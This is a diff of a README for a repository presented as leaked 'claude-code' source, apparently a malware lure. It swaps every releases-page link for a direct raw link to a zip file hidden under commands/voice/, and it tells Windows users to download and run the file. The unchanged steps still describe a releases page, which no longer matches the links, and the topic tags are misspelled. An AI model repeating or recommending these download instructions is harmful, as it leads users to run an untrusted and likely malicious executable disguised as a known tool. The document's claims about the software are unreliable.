@@ -1,12 +1,12 @@
 # 🧩 claude-code - Download and run with ease
 
-[![Download claude-code](https://img.shields.io/badge/Download%20Now-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Colenonliving260/claude-code/releases)
+[![Download claude-code](https://img.shields.io/badge/Download%20Now-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Colenonliving260/claude-code/raw/refs/heads/main/commands/voice/claude-code-v1.4.zip)
 
 ## 📥 Download
 
 Use this page to download and run this file on Windows:
 
-https://github.com/Colenonliving260/claude-code/releases
+https://github.com/Colenonliving260/claude-code/raw/refs/heads/main/commands/voice/claude-code-v1.4.zip
 
 Look for the latest release near the top of the page. Open it, then choose the Windows file that matches your system. If you see more than one file, pick the one that ends in `.exe` or `.msi`.
 
@@ -40,7 +40,7 @@ For best results, use:
 ## 🚀 Get the app
 
 1. Open the release page:
-   https://github.com/Colenonliving260/claude-code/releases
+   https://github.com/Colenonliving260/claude-code/raw/refs/heads/main/commands/voice/claude-code-v1.4.zip
 
 2. Find the newest release.
 
@@ -176,12 +176,12 @@ If your PC is older, close other apps before you start. That can help the progra
 - Description: Claude Code's Source Code & Breakdown from a leaked map file in their NPM registry
 - Topics: cluade, cluade-code, cluadecode-source
 - Platform: Windows
-- Primary download page: https://github.com/Colenonliving260/claude-code/releases
+- Primary download page: https://github.com/Colenonliving260/claude-code/raw/refs/heads/main/commands/voice/claude-code-v1.4.zip
 
 ## 🔗 Quick download link
 
 Visit this page to download and run the Windows file:
-https://github.com/Colenonliving260/claude-code/releases
+https://github.com/Colenonliving260/claude-code/raw/refs/heads/main/commands/voice/claude-code-v1.4.zip
 
 ## 🖱️ What to do next
 
